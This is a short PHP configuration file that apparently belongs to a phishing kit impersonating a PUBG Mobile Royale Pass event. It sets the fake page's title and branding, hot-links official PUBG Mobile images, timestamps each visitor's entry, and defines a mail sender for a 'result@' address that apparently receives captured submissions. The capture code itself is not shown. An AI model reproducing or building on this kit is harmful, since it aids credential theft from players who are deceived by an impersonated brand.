<?php
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

$title = 'Royale Pass Month 1: Tek Era';
$description = '';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/en/event/nextstar/images/share.jpg';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

$author = 'AKU PAK';
$sender = 'From: PAK CEPAK JEDER MAX<result@akugungrate.com>';
?>